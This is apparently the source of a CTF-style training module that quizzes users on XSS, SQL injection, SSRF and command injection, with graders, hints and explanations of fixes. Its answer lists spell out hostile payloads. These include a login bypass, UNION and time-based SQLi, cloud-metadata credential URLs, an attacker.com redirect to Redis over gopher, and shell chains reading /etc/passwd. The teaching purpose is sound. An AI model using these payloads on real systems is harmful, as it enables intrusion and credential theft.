#!/usr/bin/env python3
"""
Fray Learn — Interactive CTF-style security tutorial

Usage:
    fray learn                  List available topics
    fray learn xss              Start XSS challenge series
    fray learn sqli --level 2   Jump to specific level
    fray learn --list            List all topics and progress

Each topic contains a series of challenges where the user must:
    1. Read the scenario (vulnerable code snippet)
    2. Craft a payload that would bypass the defense
    3. Explain why the payload works
    4. Advance to the next level

Zero external dependencies — uses only Python stdlib.
"""

import json
import os
import sys
import hashlib
import textwrap
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from fray import __version__, PACKAGE_DIR


class Colors:
    """Terminal colors"""
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'


# ── Challenge Database ───────────────────────────────────────────────────────
# Each topic has multiple levels, progressively harder.

CHALLENGES: Dict[str, Dict] = {
    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "description": "Learn to craft XSS payloads that bypass common filters and WAFs.",
        "icon": "\u26a1",
        "levels": [
            {
                "level": 1,
                "title": "Hello, Script!",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    A web app reflects user input directly into the page:

                        <div>Welcome, USER_INPUT!</div>

                    There is NO sanitization. Inject JavaScript to show an alert."""),
                "hint": "The simplest XSS payload uses <script> tags.",
                "valid_answers": [
                    "<script>alert(1)</script>",
                    "<script>alert('xss')</script>",
                    "<script>alert(document.cookie)</script>",
                    "<script>alert`1`</script>",
                ],
                "accept_pattern": r"<script[^>]*>.*alert.*</script>",
                "explanation": textwrap.dedent("""\
                    When user input is reflected without sanitization, any HTML/JS
                    is interpreted by the browser. The <script> tag executes JavaScript
                    directly. This is the most basic form of Reflected XSS."""),
                "owasp": "A03:2021 - Injection",
                "points": 10,
            },
            {
                "level": 2,
                "title": "Tag Blocked!",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    The app now blocks <script> tags (case-insensitive):

                        input = input.replace(/<script[^>]*>/gi, '')
                                     .replace(/<\\/script>/gi, '')

                    Inject JavaScript WITHOUT using <script> tags."""),
                "hint": "HTML event handlers like onerror, onload can execute JS.",
                "valid_answers": [
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<img src=x onerror='alert(1)'>",
                    "<svg/onload=alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<details open ontoggle=alert(1)>",
                ],
                "accept_pattern": r"<(?!script)[a-z]+[^>]*on\w+=.*alert.*>",
                "explanation": textwrap.dedent("""\
                    Blocking <script> tags alone is insufficient. HTML has many
                    elements with event handlers (onerror, onload, onfocus, ontoggle)
                    that execute JavaScript. This is why output encoding is preferred
                    over blacklist-based input filtering."""),
                "owasp": "A03:2021 - Injection",
                "points": 15,
            },
            {
                "level": 3,
                "title": "Attribute Escape",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    User input is placed inside an HTML attribute:

                        <input type="text" value="USER_INPUT">

                    The app filters < and > characters.
                    Break out of the attribute to inject JS."""),
                "hint": "Close the attribute with a quote, then use an event handler.",
                "valid_answers": [
                    '" onfocus=alert(1) autofocus="',
                    '" onmouseover=alert(1) "',
                    '" onfocus="alert(1)" autofocus="',
                    "\" onfocus=alert(1) autofocus=\"",
                ],
                "accept_pattern": r'"[^"]*on\w+=.*alert',
                "explanation": textwrap.dedent("""\
                    When input is inside an attribute, you can break out by closing
                    the quote. Even without < or >, event handlers within the same
                    tag can execute JavaScript. The fix is to HTML-entity-encode
                    quotes and use Content Security Policy."""),
                "owasp": "A03:2021 - Injection",
                "points": 20,
            },
            {
                "level": 4,
                "title": "Case Trickery",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    The WAF blocks these keywords (case-insensitive):
                        alert, prompt, confirm, eval, Function

                    The app also blocks <script>, <img>, <svg>, <body> tags.
                    Somehow pop an alert box."""),
                "hint": "JavaScript is case-sensitive. Try encoding or alternative APIs.",
                "valid_answers": [
                    "<details open ontoggle=window['al'+'ert'](1)>",
                    "<video src onerror=self['al'+'ert'](1)>",
                    "<marquee onstart=self['al'+'ert'](1)>",
                    "<input onfocus=self['al'+'ert'](1) autofocus>",
                ],
                "accept_pattern": r"(al.*ert|\\u0061lert|top\[|self\[|window\[)",
                "explanation": textwrap.dedent("""\
                    WAF keyword blocking can be bypassed using string concatenation
                    (window['al'+'ert']), Unicode escapes (\\u0061lert), or
                    alternative execution paths (top[], self[]). This demonstrates
                    why allowlist-based CSP is more reliable than keyword filtering."""),
                "owasp": "A03:2021 - Injection",
                "points": 25,
            },
            {
                "level": 5,
                "title": "DOM Clobbering",
                "difficulty": "Advanced",
                "scenario": textwrap.dedent("""\
                    The site uses a strict CSP that blocks inline scripts:
                        Content-Security-Policy: script-src 'self'

                    But the app has this vulnerable code in a .js file it loads:

                        let url = window.config?.redirectUrl || '/default';
                        location.href = url;

                    Inject HTML (no <script>) that makes this redirect to javascript:alert(1)"""),
                "hint": "DOM clobbering: <a> tags with id/name can override JS globals.",
                "valid_answers": [
                    '<a id="config" href="javascript:alert(1)"><a id="config" name="redirectUrl" href="javascript:alert(1)">',
                    "<a id=config><a id=config name=redirectUrl href=javascript:alert(1)>",
                ],
                "accept_pattern": r"<a[^>]*id=.?config[^>]*>.*<a[^>]*name=.?redirectUrl",
                "explanation": textwrap.dedent("""\
                    DOM clobbering uses HTML elements (especially <a>, <form>, <img>)
                    with id/name attributes to shadow JavaScript variables. When code
                    accesses window.config, it gets the DOM element instead of undefined.
                    Named properties on <a> like href become accessible via the property
                    chain. This bypasses CSP because no inline script is used."""),
                "owasp": "A03:2021 - Injection",
                "points": 40,
            },
        ],
    },
    "sqli": {
        "title": "SQL Injection",
        "description": "Master SQL injection from basic UNION to blind extraction.",
        "icon": "\U0001f5c4",
        "levels": [
            {
                "level": 1,
                "title": "Login Bypass",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    The login form runs this query:

                        SELECT * FROM users
                        WHERE username='USER_INPUT' AND password='PASS_INPUT'

                    Bypass authentication without knowing the password."""),
                "hint": "Close the string and add OR 1=1 to make the WHERE always true.",
                "valid_answers": [
                    "' OR 1=1--",
                    "' OR '1'='1'--",
                    "' OR 1=1 --",
                    "admin'--",
                    "' OR 1=1#",
                    "' OR ''='",
                ],
                "accept_pattern": r"'.*(\bOR\b.*=|'--)",
                "explanation": textwrap.dedent("""\
                    By injecting ' OR 1=1--, the query becomes:
                        WHERE username='' OR 1=1--' AND password='...'
                    The -- comments out the rest, and OR 1=1 is always true,
                    so the query returns all users. The fix: use parameterized
                    queries / prepared statements."""),
                "owasp": "A03:2021 - Injection",
                "points": 10,
            },
            {
                "level": 2,
                "title": "UNION Attack",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    A product search uses:

                        SELECT name, price FROM products WHERE id=USER_INPUT

                    The result shows 2 columns. Extract the database version."""),
                "hint": "Use UNION SELECT to append your own query. Match column count.",
                "valid_answers": [
                    "1 UNION SELECT version(),null--",
                    "1 UNION SELECT @@version,null--",
                    "0 UNION SELECT version(),2--",
                    "-1 UNION SELECT version(),null--",
                ],
                "accept_pattern": r"UNION\s+SELECT\s+.*(version|@@version)",
                "explanation": textwrap.dedent("""\
                    UNION SELECT appends results from another query. The column count
                    must match (2 in this case). version() (MySQL/PostgreSQL) or
                    @@version (SQL Server) returns the DB version. This is the first
                    step in data exfiltration via SQLi."""),
                "owasp": "A03:2021 - Injection",
                "points": 15,
            },
            {
                "level": 3,
                "title": "Blind Boolean",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    The app shows "Product found" or "Not found" based on:

                        SELECT * FROM products WHERE id=USER_INPUT

                    No data is displayed directly. Determine if the first character
                    of the database name is 'm' (for 'mysql')."""),
                "hint": "Use a boolean condition: AND SUBSTRING(database(),1,1)='m'",
                "valid_answers": [
                    "1 AND SUBSTRING(database(),1,1)='m'",
                    "1 AND LEFT(database(),1)='m'",
                    "1 AND ASCII(SUBSTRING(database(),1,1))=109",
                    "1 AND MID(database(),1,1)='m'",
                ],
                "accept_pattern": r"AND\s+(SUBSTRING|LEFT|MID|ASCII).*database\(\)",
                "explanation": textwrap.dedent("""\
                    Blind SQL injection extracts data one bit/character at a time by
                    observing the application's boolean response (found vs not found).
                    SUBSTRING(database(),1,1)='m' tests the first character. Automated
                    tools like sqlmap use this technique with binary search for speed."""),
                "owasp": "A03:2021 - Injection",
                "points": 25,
            },
            {
                "level": 4,
                "title": "WAF Bypass — Spaces Blocked",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    The WAF blocks spaces in the input. The query is:

                        SELECT * FROM users WHERE id=USER_INPUT

                    Retrieve data using UNION SELECT without any spaces."""),
                "hint": "Use /**/ (comments) or %09 (tab) as space replacements.",
                "valid_answers": [
                    "1/**/UNION/**/SELECT/**/version(),null--",
                    "1%09UNION%09SELECT%09version(),null--",
                    "1\tUNION\tSELECT\tversion(),null--",
                ],
                "accept_pattern": r"(/\*\*/|%09|%0a|\\t).*UNION.*(SELECT|select)",
                "explanation": textwrap.dedent("""\
                    WAFs often block spaces but SQL allows comments (/**/) and
                    alternative whitespace (%09=tab, %0a=newline) between tokens.
                    This is a common WAF bypass technique. Defense: parameterized
                    queries make this irrelevant regardless of WAF rules."""),
                "owasp": "A03:2021 - Injection",
                "points": 30,
            },
            {
                "level": 5,
                "title": "Time-Based Blind",
                "difficulty": "Advanced",
                "scenario": textwrap.dedent("""\
                    The app gives the SAME response regardless of query result.
                    No error messages. No content difference. The query is:

                        SELECT * FROM users WHERE id=USER_INPUT

                    Confirm SQL injection exists using a time-based technique."""),
                "hint": "IF(condition, SLEEP(5), 0) — if the page takes 5s, it's injectable.",
                "valid_answers": [
                    "1 AND SLEEP(5)",
                    "1 AND IF(1=1,SLEEP(5),0)",
                    "1; WAITFOR DELAY '0:0:5'--",
                    "1 AND (SELECT SLEEP(5))",
                    "1 OR SLEEP(5)",
                ],
                "accept_pattern": r"(SLEEP\(\d+\)|WAITFOR\s+DELAY|BENCHMARK\()",
                "explanation": textwrap.dedent("""\
                    Time-based blind SQLi uses database sleep functions to infer
                    boolean results. If the page takes 5 seconds to respond, the
                    condition was true. MySQL uses SLEEP(), SQL Server uses
                    WAITFOR DELAY, PostgreSQL uses pg_sleep(). This is the slowest
                    but most reliable blind injection technique."""),
                "owasp": "A03:2021 - Injection",
                "points": 35,
            },
        ],
    },
    "ssrf": {
        "title": "Server-Side Request Forgery (SSRF)",
        "description": "Exploit SSRF vulnerabilities to access internal services.",
        "icon": "\U0001f310",
        "levels": [
            {
                "level": 1,
                "title": "Internal Access",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    The app fetches a URL you provide:

                        fetch(USER_INPUT).then(r => r.text())

                    Access the AWS metadata endpoint to steal credentials."""),
                "hint": "AWS metadata lives at http://169.254.169.254/",
                "valid_answers": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://169.254.169.254/",
                ],
                "accept_pattern": r"169\.254\.169\.254",
                "explanation": textwrap.dedent("""\
                    The AWS EC2 metadata service at 169.254.169.254 provides instance
                    credentials, tokens, and configuration. SSRF to this endpoint is
                    one of the most critical cloud vulnerabilities (e.g., Capital One
                    breach 2019). Fix: IMDSv2 (requires token), network policies,
                    or URL allowlists."""),
                "owasp": "A10:2021 - SSRF",
                "points": 10,
            },
            {
                "level": 2,
                "title": "Filter Bypass",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    The app now blocks URLs containing '169.254.169.254':

                        if '169.254.169.254' in url:
                            return 'Blocked!'
                        response = fetch(url)

                    Access the metadata endpoint despite the filter."""),
                "hint": "IP addresses can be represented in decimal, hex, or octal.",
                "valid_answers": [
                    "http://2852039166/latest/meta-data/",
                    "http://0xa9fea9fe/latest/meta-data/",
                    "http://0251.0376.0251.0376/latest/meta-data/",
                    "http://[::ffff:169.254.169.254]/latest/meta-data/",
                    "http://169.254.169.254.nip.io/latest/meta-data/",
                ],
                "accept_pattern": r"(2852039166|0xa9fea9fe|0251\.0376|::ffff:|nip\.io|xip\.io)",
                "explanation": textwrap.dedent("""\
                    IP addresses have multiple representations:
                    - Decimal: 2852039166
                    - Hex: 0xa9fea9fe
                    - Octal: 0251.0376.0251.0376
                    - IPv6: [::ffff:169.254.169.254]
                    - DNS rebinding: 169.254.169.254.nip.io
                    String-matching blocklists are trivially bypassed. Use proper URL
                    parsing and validate the resolved IP against deny lists."""),
                "owasp": "A10:2021 - SSRF",
                "points": 25,
            },
            {
                "level": 3,
                "title": "Protocol Smuggling",
                "difficulty": "Advanced",
                "scenario": textwrap.dedent("""\
                    The app validates that the URL starts with 'https://':

                        if not url.startswith('https://'):
                            return 'Only HTTPS allowed!'
                        response = curl(url)  # Uses libcurl

                    The server runs Redis on localhost:6379.
                    Use protocol smuggling to execute a Redis command."""),
                "hint": "Try gopher:// via redirect, or abuse URL parsing differences.",
                "valid_answers": [
                    "https://attacker.com/redirect?url=gopher://127.0.0.1:6379/_INFO",
                    "https://attacker.com/302?to=gopher://localhost:6379/_KEYS%20*",
                ],
                "accept_pattern": r"(gopher://|dict://|redirect.*localhost|302.*127\.0\.0\.1)",
                "explanation": textwrap.dedent("""\
                    Even with HTTPS-only validation, an attacker can:
                    1. Host an HTTPS server that returns a 302 redirect
                    2. Redirect to gopher://127.0.0.1:6379/ with Redis commands
                    libcurl follows redirects and supports gopher://, enabling
                    protocol smuggling. Fix: disable redirect following, restrict
                    protocols to HTTP/HTTPS, validate after redirect."""),
                "owasp": "A10:2021 - SSRF",
                "points": 40,
            },
        ],
    },
    "cmdi": {
        "title": "Command Injection",
        "description": "Exploit OS command injection and learn shell escape techniques.",
        "icon": "\U0001f4bb",
        "levels": [
            {
                "level": 1,
                "title": "Ping of Death",
                "difficulty": "Beginner",
                "scenario": textwrap.dedent("""\
                    The app runs a ping command with user input:

                        os.system(f"ping -c 1 {USER_INPUT}")

                    Execute an additional command to read /etc/passwd."""),
                "hint": "Use ; or && or | to chain commands.",
                "valid_answers": [
                    "127.0.0.1; cat /etc/passwd",
                    "127.0.0.1 && cat /etc/passwd",
                    "127.0.0.1 | cat /etc/passwd",
                    "; cat /etc/passwd",
                    "| cat /etc/passwd",
                    "$(cat /etc/passwd)",
                    "`cat /etc/passwd`",
                ],
                "accept_pattern": r"(;|\||\|\||&&|`|\$\().*(/etc/passwd|id|whoami)",
                "explanation": textwrap.dedent("""\
                    Shell metacharacters (; && | || ` $()) allow chaining commands.
                    os.system() passes the string directly to the shell. Fix: use
                    subprocess.run() with a list (no shell), or validate input
                    strictly (allow only IP/hostname characters)."""),
                "owasp": "A03:2021 - Injection",
                "points": 10,
            },
            {
                "level": 2,
                "title": "Semicolons Blocked",
                "difficulty": "Intermediate",
                "scenario": textwrap.dedent("""\
                    The app now blocks ; and && and ||:

                        input = input.replace(/[;&|]/g, '')
                        os.system(f"ping -c 1 {input}")

                    Execute a command anyway."""),
                "hint": "Newlines (\\n) and backticks/$(cmd) still work.",
                "valid_answers": [
                    "127.0.0.1\nid",
                    "127.0.0.1%0aid",
                    "$(id)",
                    "`id`",
                    "127.0.0.1\ncat /etc/passwd",
                ],
                "accept_pattern": r"(\\n|%0a|`.*`|\$\(.*\))",
                "explanation": textwrap.dedent("""\
                    Blocking ; and | is insufficient. Newlines (\\n / %0a) act as
                    command separators. Command substitution with `cmd` or $(cmd)
                    executes commands within the argument. Backtick and $() are
                    evaluated before the outer command runs. The only safe approach
                    is to avoid shell=True entirely."""),
                "owasp": "A03:2021 - Injection",
                "points": 20,
            },
            {
                "level": 3,
                "title": "No Spaces Allowed",
                "difficulty": "Advanced",
                "scenario": textwrap.dedent("""\
                    The app blocks spaces, ;, &, |, and backticks:

                        if re.search(r'[\\s;&|`$]', input):
                            return 'Blocked!'
                        os.system(f"ping -c 1 {input}")

                    Execute 'cat /etc/passwd' without spaces or blocked chars."""),
                "hint": "Use {IFS} as a space replacement, or brace expansion.",
                "valid_answers": [
                    "{cat,/etc/passwd}",
                    "cat${IFS}/etc/passwd",
                    "cat<>/etc/passwd",
                    "%0acat${IFS}/etc/passwd",
                ],
                "accept_pattern": r"(\{IFS\}|\$\{IFS\}|<>|\{cat,|%09)",
                "explanation": textwrap.dedent("""\
                    Without spaces: $IFS (Internal Field Separator) defaults to space.
                    Brace expansion {cat,/etc/passwd} executes commands without spaces.
                    Redirect operators (<>) can sometimes replace spaces. These
                    techniques are commonly used in CTFs and real WAF bypasses."""),
                "owasp": "A03:2021 - Injection",
                "points": 35,
            },
        ],
    },
}


# ── Progress Tracking ────────────────────────────────────────────────────────

def _progress_file() -> Path:
    """Get the progress file path."""
    return Path.home() / ".fray" / "learn_progress.json"


def load_progress() -> Dict:
    """Load user's learning progress."""
    pf = _progress_file()
    if pf.exists():
        try:
            with open(pf, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            pass
    return {"topics": {}, "total_points": 0, "challenges_solved": 0}


def save_progress(progress: Dict):
    """Save user's learning progress."""
    pf = _progress_file()
    pf.parent.mkdir(parents=True, exist_ok=True)
    with open(pf, "w", encoding="utf-8") as f:
        json.dump(progress, f, indent=2, ensure_ascii=False)


def get_topic_progress(progress: Dict, topic: str) -> Dict:
    """Get progress for a specific topic."""
    if topic not in progress["topics"]:
        progress["topics"][topic] = {"completed_levels": [], "points": 0}
    return progress["topics"][topic]


# ── Display Helpers ──────────────────────────────────────────────────────────

def _banner():
    """Print the learn mode banner."""
    print(f"""
{Colors.BOLD}{Colors.CYAN}
  ╔═══════════════════════════════════════════════╗
  ║        FRAY LEARN — CTF Training Mode         ║
  ║         Interactive Security Challenges        ║
  ╚═══════════════════════════════════════════════╝{Colors.END}
  {Colors.DIM}Fray v{__version__} • https://github.com/dalisecurity/fray{Colors.END}
""")


def list_topics(progress: Dict):
    """Display available topics with progress."""
    _banner()
    print(f"  {Colors.BOLD}Available Topics:{Colors.END}\n")

    for key, topic in CHALLENGES.items():
        tp = get_topic_progress(progress, key)
        total = len(topic["levels"])
        done = len(tp["completed_levels"])
        bar = _progress_bar(done, total)
        pts = tp["points"]

        status = f"{Colors.GREEN}COMPLETE{Colors.END}" if done == total else f"{done}/{total}"
        print(f"  {topic['icon']}  {Colors.BOLD}{topic['title']}{Colors.END}")
        print(f"     {Colors.DIM}{topic['description']}{Colors.END}")
        print(f"     {bar}  {status}  ({pts} pts)")
        print(f"     {Colors.DIM}fray learn {key}{Colors.END}")
        print()

    total_pts = progress.get("total_points", 0)
    total_solved = progress.get("challenges_solved", 0)
    max_pts = sum(
        sum(l["points"] for l in t["levels"])
        for t in CHALLENGES.values()
    )
    print(f"  {Colors.DIM}{'─' * 45}{Colors.END}")
    print(f"  {Colors.BOLD}Score: {total_pts}/{max_pts} pts{Colors.END}  |  "
          f"{Colors.BOLD}Solved: {total_solved}/{sum(len(t['levels']) for t in CHALLENGES.values())}{Colors.END}")
    print()


def _progress_bar(done: int, total: int, width: int = 20) -> str:
    """Render a text progress bar."""
    filled = int(width * done / total) if total > 0 else 0
    bar = f"{Colors.GREEN}{'█' * filled}{Colors.DIM}{'░' * (width - filled)}{Colors.END}"
    return f"[{bar}]"


# ── Challenge Runner ─────────────────────────────────────────────────────────

def check_answer(user_input: str, challenge: Dict) -> bool:
    """Check if user's answer matches valid answers or pattern."""
    import re
    normalized = user_input.strip()

    # Exact match (case-insensitive for SQL keywords)
    for valid in challenge.get("valid_answers", []):
        if normalized.lower() == valid.lower():
            return True

    # Pattern match
    pattern = challenge.get("accept_pattern", "")
    if pattern:
        try:
            if re.search(pattern, normalized, re.IGNORECASE):
                return True
        except re.error:
            pass

    return False


def run_challenge(topic_key: str, level: Optional[int] = None):
    """Run an interactive challenge session."""
    if topic_key not in CHALLENGES:
        print(f"\n  {Colors.RED}Unknown topic: '{topic_key}'{Colors.END}")
        print(f"  {Colors.DIM}Available: {', '.join(CHALLENGES.keys())}{Colors.END}\n")
        return

    topic = CHALLENGES[topic_key]
    progress = load_progress()
    tp = get_topic_progress(progress, topic_key)

    # Determine starting level
    if level is not None:
        if level < 1 or level > len(topic["levels"]):
            print(f"\n  {Colors.RED}Invalid level. {topic_key} has levels 1-{len(topic['levels'])}{Colors.END}")
            return
        start_idx = level - 1
    else:
        # Start from the first unsolved level
        completed = set(tp["completed_levels"])
        start_idx = 0
        for i, lv in enumerate(topic["levels"]):
            if lv["level"] not in completed:
                start_idx = i
                break
        else:
            # All complete — start from beginning
            start_idx = 0

    _banner()
    print(f"  {topic['icon']}  {Colors.BOLD}{topic['title']}{Colors.END}")
    print(f"  {Colors.DIM}{topic['description']}{Colors.END}")
    print()

    for i in range(start_idx, len(topic["levels"])):
        challenge = topic["levels"][i]
        completed = challenge["level"] in tp["completed_levels"]

        # Level header
        diff_color = {
            "Beginner": Colors.GREEN,
            "Intermediate": Colors.YELLOW,
            "Advanced": Colors.RED,
        }.get(challenge["difficulty"], Colors.DIM)

        print(f"  {Colors.DIM}{'━' * 50}{Colors.END}")
        flag = f" {Colors.GREEN}[SOLVED]{Colors.END}" if completed else ""
        print(f"  {Colors.BOLD}Level {challenge['level']}: {challenge['title']}{Colors.END}{flag}")
        print(f"  {diff_color}{challenge['difficulty']}{Colors.END}  |  {challenge['points']} pts  |  {challenge.get('owasp', '')}")
        print()

        # Scenario
        print(f"  {Colors.CYAN}SCENARIO:{Colors.END}")
        for line in challenge["scenario"].split("\n"):
            print(f"    {line}")
        print()

        # Challenge loop
        attempts = 0
        max_attempts = 5
        while True:
            try:
                answer = input(f"  {Colors.BOLD}Your payload>{Colors.END} ").strip()
            except (EOFError, KeyboardInterrupt):
                print(f"\n\n  {Colors.DIM}Exiting learn mode.{Colors.END}\n")
                save_progress(progress)
                return

            if not answer:
                continue

            if answer.lower() in ("quit", "exit", "q"):
                print(f"\n  {Colors.DIM}Progress saved. See you next time!{Colors.END}\n")
                save_progress(progress)
                return

            if answer.lower() in ("hint", "h"):
                print(f"\n  {Colors.YELLOW}HINT: {challenge['hint']}{Colors.END}\n")
                continue

            if answer.lower() in ("skip", "s"):
                print(f"\n  {Colors.YELLOW}Skipping level {challenge['level']}...{Colors.END}\n")
                break

            if answer.lower() in ("explain", "e", "answer", "a"):
                print(f"\n  {Colors.MAGENTA}EXPLANATION:{Colors.END}")
                for line in challenge["explanation"].split("\n"):
                    print(f"    {line}")
                print(f"\n  {Colors.DIM}Example answers:{Colors.END}")
                for va in challenge["valid_answers"][:3]:
                    print(f"    {Colors.GREEN}{va}{Colors.END}")
                print()
                continue

            attempts += 1

            if check_answer(answer, challenge):
                # Correct!
                if not completed:
                    tp["completed_levels"].append(challenge["level"])
                    tp["points"] += challenge["points"]
                    progress["total_points"] = progress.get("total_points", 0) + challenge["points"]
                    progress["challenges_solved"] = progress.get("challenges_solved", 0) + 1
                    save_progress(progress)

                print(f"\n  {Colors.GREEN}{Colors.BOLD}CORRECT!{Colors.END} +{challenge['points']} pts")
                print(f"\n  {Colors.MAGENTA}WHY IT WORKS:{Colors.END}")
                for line in challenge["explanation"].split("\n"):
                    print(f"    {line}")
                print()
                break
            else:
                remaining = max_attempts - attempts
                if remaining > 0:
                    print(f"  {Colors.RED}Incorrect.{Colors.END} {remaining} attempt(s) remaining. "
                          f"Type '{Colors.DIM}hint{Colors.END}' for a hint.")
                else:
                    print(f"\n  {Colors.RED}Out of attempts.{Colors.END} Here's the explanation:")
                    print(f"\n  {Colors.MAGENTA}EXPLANATION:{Colors.END}")
                    for line in challenge["explanation"].split("\n"):
                        print(f"    {line}")
                    print(f"\n  {Colors.DIM}Example answers:{Colors.END}")
                    for va in challenge["valid_answers"][:3]:
                        print(f"    {Colors.GREEN}{va}{Colors.END}")
                    print()
                    break

        # Continue prompt between levels
        if i < len(topic["levels"]) - 1:
            try:
                cont = input(f"  {Colors.BLUE}Continue to Level {topic['levels'][i+1]['level']}? [Y/n]: {Colors.END}").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print(f"\n\n  {Colors.DIM}Progress saved.{Colors.END}\n")
                save_progress(progress)
                return
            if cont in ("n", "no"):
                break

    # Session summary
    total_done = len(tp["completed_levels"])
    total_levels = len(topic["levels"])
    print(f"\n  {Colors.DIM}{'━' * 50}{Colors.END}")
    print(f"  {Colors.BOLD}Session Complete!{Colors.END}")
    print(f"  {_progress_bar(total_done, total_levels)}  {total_done}/{total_levels} levels  |  {tp['points']} pts")
    if total_done == total_levels:
        print(f"  {Colors.GREEN}{Colors.BOLD}Topic mastered!{Colors.END}")
    print()
    save_progress(progress)


# ── Entry Point ──────────────────────────────────────────────────────────────

def run_learn(
    topic: Optional[str] = None,
    level: Optional[int] = None,
    list_all: bool = False,
    reset: bool = False,
):
    """Main entry point for fray learn command."""

    if reset:
        pf = _progress_file()
        if pf.exists():
            pf.unlink()
            print(f"  {Colors.GREEN}Progress reset.{Colors.END}")
        else:
            print(f"  {Colors.DIM}No progress to reset.{Colors.END}")
        return

    progress = load_progress()

    if list_all or topic is None:
        list_topics(progress)
        return

    run_challenge(topic, level=level)
